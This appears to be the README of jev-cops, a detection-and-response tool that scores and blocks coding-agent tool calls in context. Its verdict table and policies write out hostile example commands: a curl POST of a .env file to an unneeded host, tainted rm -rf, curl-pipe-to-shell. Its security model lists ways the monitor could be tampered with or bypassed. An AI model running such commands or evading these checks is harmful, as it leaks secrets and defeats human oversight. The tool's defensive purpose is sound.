<div align="center">

# jev-cops

**Context-aware policing for coding agents.**
Every tool call your agent makes is judged in context and gets a graduated verdict,
before it runs.

[![CI](https://github.com/FrancoisChastel/jev-cops/actions/workflows/ci.yml/badge.svg)](https://github.com/FrancoisChastel/jev-cops/actions/workflows/ci.yml)
[![npm](https://img.shields.io/npm/v/jev-cops?label=npm)](https://www.npmjs.com/package/jev-cops)
[![License: Apache-2.0](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](LICENSE)
[![Runtime: Bun ≥ 1.3](https://img.shields.io/badge/runtime-Bun%20%E2%89%A5%201.3-black)](https://bun.sh)
![Status: pre-1.0](https://img.shields.io/badge/status-pre--1.0-orange)

*The cops for your coding agents. They don't lock anyone up (that's the sandbox's job),
but they watch every move, write it all down, and call for backup when it matters.*

</div>

---

Coding agents run shell commands, edit files and call the network with your privileges.
Allow-lists are too blunt: `git push --force` is fine on a feature branch you asked about
and a disaster on `main` in an unattended run. **jev-cops judges the call, not the string.**
It sits beside the agent harness, scores each tool call on *who typed the arguments, whether
the action serves the task, what just happened, how exposed the target is, and whether it
can be undone*, and returns one of six verdicts:

`allow` · `annotate` · `rewrite` · `hold` · `deny` · `kill`

| The agent wants to… | …in this context | jev-cops says |
|---|---|---|
| `git push --force` | feature branch the user asked about | **allow** |
| `git push --force` | default branch, a human is watching | **hold**: the human is asked |
| `git push --force` | default branch, headless run | **deny** |
| `rm -rf node_modules` | inside the repo | **allow** |
| `rm -rf <path>` | the path first appeared in a tool's output | **deny** |
| `curl -X POST <host> -d @.env` | right after reading a secret, host not needed by the task | **kill** with the semantic judge on, **hold** without |
| edit `~/.claude/settings.json` | always | **kill**: that's tampering with the guard |

## Contents

- [Features](#features) · [Supported agents](#supported-agents) · [Install](#install) ·
  [Quickstart](#quickstart) · [How it works](#how-it-works) · [Policies](#policies) ·
  [Semantic judge](#semantic-judge-optional) · [Configuration](#configuration) ·
  [Commands](#commands) · [Security model](#security-model) · [Roadmap](#roadmap) ·
  [Development](#development) · [Contributing](#contributing)

## Features

- **Context, not patterns.** Five deterministic features per call: *taint* (did the
  arguments come from untrusted tool output?), *scope* (does it serve the declared task?),
  *sequence* (secret read then network?), *environment* (default branch, headless,
  sandbox?) and *reversibility*. The same command gets different verdicts in different
  contexts.
- **Code decides, models only raise.** An optional semantic judge answers typed questions
  for the grey zone. A model answer can raise risk without limit but can lower the
  deterministic floor by at most 0.2, and never turns a `deny` into an `allow`.
- **Fail closed where it matters.** A daemon that is down, slow or answering garbage means
  the call is blocked, never allowed by timeout. Reads keep working.
- **Graduated responses.** Annotate the agent's context, rewrite the call (pin resolved
  paths), ask the human, deny, or end the session, instead of a binary yes/no.
- **Policies as code.** TypeScript policies with typed questions and a fixtures file each;
  `cops test` fails the build on any mismatch; `cops replay` re-judges recorded sessions.
- **Tamper-aware.** Editing the harness's hook settings, the policies or the judge's own
  records ends the session. The audit log is append-only and hash-chained.
- **The human sees details, the agent sees reasons.** Scores and evidence never reach the
  agent; `cops explain <event-id>` shows the full decision to you.
- **Observe first.** It starts in observe mode: every verdict is logged, nothing is
  blocked, until you switch to enforce.

## Supported agents

| Harness | Status | How |
|---|---|---|
| [Claude Code](https://code.claude.com) | ✅ supported | command hook on every tool call, prompt and settings change; verified against `claude` 2.1.280 ([capture](docs/captures/claude-code-m1.md)) |
| [Pi](https://pi.dev) | ✅ supported | extension; verified against `pi` ([capture](docs/captures/pi-m0.md)) |
| Codex | 🗓 planned (M3) | |
| OpenCode | 🗓 planned (M3) | |

## Install

Requires **[Bun](https://bun.sh) ≥ 1.3** (macOS or Linux). Node is not a supported runtime.

```bash
bun add -g jev-cops        # installs the cops, copsd and cops-hook commands and the starter policies
```

<details>
<summary>From source</summary>

```bash
git clone https://github.com/FrancoisChastel/jev-cops && cd jev-cops
bun install
bun run build              # dist/cops, dist/copsd, dist/cops-hook (single-file binaries)
export PATH="$PWD/dist:$PATH"
```

</details>

## Quickstart

```bash
copsd &                               # the judge; starts in observe mode (logs, blocks nothing)
cops install claude-code --dry-run    # show the settings change, write nothing
cops install claude-code              # register the hook (also: cops install pi)
cops doctor                           # check the daemon, the hook, and run a canary call
```

`cops install` merges its hook into your settings with a backup, refuses unsafe setups
(for example a bare `Bash` rule in `permissions.allow`, which would let calls skip the
prompt), and proves the hook works with a canary before it returns. `cops doctor` re-checks
everything and prints every known gap it cannot close. `--uninstall` removes only what
jev-cops added.

Use your agent as usual. When you're ready to block, not just log:

```bash
copsd --enforce &
```

Look at any decision:

```bash
cops explain evt_01M3R7XFDAG4PC4K5HB5BPFK00
```

```text
# abridged
verdict hold · risk 0.21 · floor 0.21
reason: Irreversible git operation on the default branch.
command: git push --force origin main
features:
  environment   0.40  default branch; no sandbox
  reversibility 1.00  irreversible verb: force, irreversible
policies:
  default-branch-guard@2  matched → hold
```

## How it works

```text
 agent harness ──tool call──▶ adapter ──canonical event──▶ copsd
 (Claude Code, Pi)            (thin, no policy)            │ 1 normalize  tree-sitter-bash, decode base64/hex,
                                                           │              expand ~ and $HOME, resolve paths
                                                           │ 2 context    taint · scope · sequence ·
                                                           │              environment · reversibility → floor risk
                                                           │ 3 policies   deterministic prefilter, then optional
                                                           │              typed questions to a semantic judge
                                                           │ 4 verdict    monotonic: code decides, a model can only raise
 agent harness ◀─allow/rewrite/ask/deny/stop── adapter ◀─verdict─┘
```

- **Adapters are thin.** Each translates the harness's hook events into one canonical
  schema and the verdict back. No policy logic lives in an adapter.
- **One daemon judges.** `copsd` is a separate process on a Unix socket (under a kernel
  sandbox it sits outside the sandbox), and keeps a per-session case file (files read and written, hosts contacted, secret reads,
  the taint set, a risk budget).
- **Risk budget.** Many small off-task steps add up: at 80 % of the session's budget every
  verdict rises one step; at 100 % every non-read action is held for a human.
- **Precedents.** When a human approves a hold, the daemon records a narrow, expiring
  precedent it proposes itself; the agent never chooses the scope.

The full design is in the [spec](docs/SPEC.md).

## Policies

Six starter policies ship with jev-cops:

| Policy | Catches | Verdicts |
|---|---|---|
| `config-tamper` | writes to harness hook settings, extensions, the policies or the judge's own records; reading the judge's records | annotate → kill |
| `default-branch-guard` | force-push, hard reset and other irreversible git on the default branch | hold, deny when headless |
| `exfil-after-secrets` | network calls to a host the task doesn't need, shortly after a secret read | annotate → kill |
| `tainted-destructive` | deletes and irreversible commands whose target came from tool output | hold → deny |
| `off-repo-write` | writes and deletes outside the repo and `/tmp` | hold |
| `opaque-exec` | `curl \| sh`, base64 pipes, `eval`, inline interpreters, freshly written executables | annotate → hold |

Write your own in TypeScript: a cheap deterministic `when`, optional typed questions,
and code that returns the verdict.

```ts
import { definePolicy, jev } from "@jev-cops/sdk";

export default definePolicy({
  name: "exfil-after-secrets",
  version: 3,
  owner: "cyber-team",
  range: ["annotate", "kill"],
  when: (e, ctx) =>
    e.call.kind === "net" && ctx.sequence.secretReadWithin("2m") && !ctx.scope.hostAllowed(e.net.host),
  ask: (e, ctx) => [
    jev.noul("dest_fits_task", `${e.net.host} is a service this task plausibly needs: ${ctx.session.task}`),
    jev.score("payload_secrecy", "How secret-like is the request payload?", ["public", "internal", "credential"]),
  ],
  decide: (_e, _ctx, a) => {
    if (a.payload_secrecy.level === "credential" && a.payload_secrecy.confidence > 0.8) return "kill";
    if (a.dest_fits_task.p < 0.4) return "deny";
    return a.dest_fits_task.p < 0.8 ? "hold" : "annotate";
  },
  reason: "Network call to a new host shortly after reading a secret.",
});
```

Every policy ships with a `*.fixtures.json` of events and expected verdicts, and
`cops test` runs them against the policy alone and with the whole set. Author guide:
[packages/sdk](packages/sdk/README.md).

## Semantic judge (optional)

Off by default: the deterministic floor and the policies decide alone. When a policy asks
typed questions and the floor is in the uncertain band, a provider answers them:

| Provider | Needs | Notes |
|---|---|---|
| `jev` (recommended) | `TYPESAFE_API_KEY` | [TypeSafe Jev](https://docs.typesafe.ai): calibrated probabilities for typed decisions |
| `openrouter` | `OPENROUTER_API_KEY` | any model with structured outputs; confidence is self-reported |
| `vercel-ai` | a `LanguageModel` you construct | bring any [AI SDK](https://ai-sdk.dev) provider, including local models |

API keys are read from the environment only, never from a config file. Details:
[packages/judge](packages/judge/README.md).

## Configuration

`~/.config/jev-cops/cops.toml`. Every key is optional, and an unknown key is an error.

```toml
[enforcement]
mode = "observe"             # "enforce" to block; observe logs what it would have done

[judge]
provider = "off"             # "jev" | "openrouter" | "vercel-ai" | "mock"
timeout_ms = 10000

[daemon]
socket = "~/.jev-cops/copsd.sock"              # the harness's hook talks here
admin_socket = "~/.jev-cops/copsd-admin.sock"  # human-only routes (budget reset, full explain)

[audit]
path = "~/.jev-cops/audit.jsonl"               # append-only, hash-chained

[policies]
dir = "~/my-policies"        # default: the bundled starter set
```

A repository may carry a `.cops.toml`, but it can only **tighten** the user's settings
(for example switch to enforce), never loosen them.

## Commands

| Command | What it does |
|---|---|
| `copsd [--enforce\|--observe]` | the judging daemon |
| `cops install claude-code\|pi` | register jev-cops with a harness (`--dry-run`, `--uninstall`, `--project`, `--managed`, …) |
| `cops doctor` | check the daemon, the audit chain, each harness install; run a canary; print every known gap |
| `cops explain <event-id>` | the full decision behind a verdict: features, policies, judge answers, detail |
| `cops test [dir]` | run every policy's fixtures, alone and with the whole set |
| `cops replay <audit.jsonl>` | re-judge recorded sessions with the current policies and show verdict changes |
| `cops budget <session-id> [--reset]` | show or reset a session's risk budget (reset needs the admin socket) |
| `cops hook --harness claude-code` | the Claude Code hook itself (normally run by Claude Code, not by you) |

`cops <command> --help` and `cops help` give every option and exit code.

## Security model

jev-cops is **detection and response for agents**, the way EDR is for endpoints: rich
context, legible explanations, an audit trail you can tune against. It is deliberately
**not a sandbox and not the last line of defence.** A hook can be bypassed by a bug in the
harness, and a process with your privileges can be killed. Anything that must never happen
belongs to a kernel-enforced sandbox such as [NVIDIA OpenShell](https://github.com/NVIDIA/openshell),
which jev-cops will compile its hard findings down to (M2).

What it guarantees today:

- **No allow by failure.** Unreachable, slow or broken judge → the call is blocked; only
  read-only tools continue, with a warning.
- **Tighten only.** jev-cops never grants what the harness would have refused; it can
  only add friction.
- **Monotonic verdicts.** Policies and models can raise a verdict, never lower one
  another's; a precedent never bypasses `kill`.
- **Anti-tamper.** Editing the hook settings, the policies or the judge's files ends the
  session; the audit log is append-only and hash-chained.

Thirteen threats (config tampering, daemon kill, hook timeout, harness gaps, obfuscation,
judge injection, precedent farming, social engineering, TOCTOU, taint laundering, task
drift, log tampering, judge exfiltration) each have an acceptance test in
[`tests/tamper`](tests/tamper/README.md). Every gap that cannot be closed without a kernel
sandbox is printed by `cops doctor` and listed in [docs/adapters.md](docs/adapters.md).

Found a bypass? Please report it privately. See [SECURITY.md](SECURITY.md).

## Roadmap

| Milestone | Scope | Status |
|---|---|---|
| M0 | core, normalizer, context engine, policy engine, SDK, starter policies, daemon, CLI, Pi adapter | ✅ done |
| M1 | Claude Code hook, `cops install`, `cops doctor`, `config-tamper` | ✅ done |
| M2 | NVIDIA OpenShell policy compilation, just-in-time grants, signed audit checkpoints shipped off-box (syslog) | 🚧 in progress |
| — | `cops setup`: one-command setup with a choice of skill scanner (e.g. NVIDIA SkillSpector) | 🚧 in progress |
| M3 | Codex and OpenCode adapters, `cops replay` over recorded sessions | 🗓 planned |
| M4 | two-week observe-only pilot, false-positive review, `deny` enabled by default | 🗓 planned |

Current status and known gaps: [docs/STATUS.md](docs/STATUS.md).

## Development

```bash
bun install
bun run check          # Biome lint + TypeScript + ~3,300 tests
bun run gate           # every starter policy against its fixtures
bun test --coverage    # fails under 80 % per file (currently ~99 %)
bun run build          # single-file binaries in dist/
```

```text
packages/core       event schema, bash normalizer, context engine, policy engine
packages/sdk        definePolicy, typed question builders, fixture runner   (@jev-cops/sdk)
packages/judge      semantic judge providers                               (@jev-cops/judge)
packages/daemon     copsd: sockets, SQLite stores, hash-chained audit log   (@jev-cops/daemon)
packages/cli        cops                                                    (@jev-cops/cli)
adapters/           claude-code (command hook) · pi (extension)
policies/           the starter policy set with fixtures                   (@jev-cops/policies)
tests/tamper        T1–T13 anti-tamper acceptance tests
docs/               spec, plans, decision log, status, adapter notes, live captures
```

Design documents: [spec](docs/SPEC.md) (the source of truth) ·
[decision log](docs/DECISIONS.md) (every choice the spec left open) ·
[adapter notes](docs/adapters.md) (verified harness behaviour and known gaps).

## Contributing

Contributions are welcome. Please read [CONTRIBUTING.md](CONTRIBUTING.md) first. The short
version: tests first, no policy logic in adapters, nothing is ever allowed because
something timed out, and every behaviour change comes with a fixture or test. Be kind:
[Code of Conduct](CODE_OF_CONDUCT.md).

## Acknowledgements

Built on [Bun](https://bun.sh), [tree-sitter-bash](https://github.com/tree-sitter/tree-sitter-bash),
[Zod](https://zod.dev) and [Biome](https://biomejs.dev). The semantic judge speaks
[TypeSafe Jev](https://docs.typesafe.ai), [OpenRouter](https://openrouter.ai) and the
[Vercel AI SDK](https://ai-sdk.dev). Hard enforcement is designed around
[NVIDIA OpenShell](https://github.com/NVIDIA/openshell).

## License

[Apache License 2.0](LICENSE). Copyright © 2026 François Chastel and contributors.
